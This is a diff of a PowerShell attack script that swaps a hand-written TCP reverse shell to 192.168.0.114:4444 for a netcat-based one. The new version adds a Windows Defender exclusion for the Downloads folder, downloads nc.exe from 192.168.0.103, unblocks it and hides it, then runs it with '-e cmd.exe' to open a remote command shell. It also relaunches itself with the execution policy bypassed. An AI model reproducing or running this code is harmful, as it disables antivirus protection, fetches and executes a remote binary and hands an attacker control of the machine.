@@ -1,7 +1,7 @@
 function Ensure-WindowsPowerShell {
     if ($PSVersionTable.PSEdition -ne 'Desktop') {
         $script = $MyInvocation.MyCommand.Definition
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File "$script""
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
         exit
     }
 }
@@ -9,29 +9,20 @@ function Ensure-WindowsPowerShell {
 Ensure-WindowsPowerShell
 
 try {
-    # Attempt Defender Exclusion (will fail silently if not admin)
+    # === Exclude Downloads from Defender scanning ===
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
-    # === Reverse shell setup ===
-    $client = "192.168.0.114"
-    $port = 4444
+    # === Download nc.exe from LAN (192.168.0.103) ===
+    $ncUrl = "http://192.168.0.103/nc.exe"
+    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"
 
-    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
-    $stream = $tcp.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $buffer = New-Object byte[] 1024
+    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
 
-    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
-        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
-        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
-        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
-        $writer.Write($sendback2)
-        $writer.Flush()
-    }
+    Unblock-File -Path $ncPath
+    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-    $writer.Close()
-    $stream.Close()
-    $tcp.Close()
+    # === Execute reverse shell to 192.168.0.103:4444 ===
+    & "$ncPath" "192.168.0.103" 4444 -e cmd.exe
 }
 catch {
     Write-Error "Execution failed: $_"
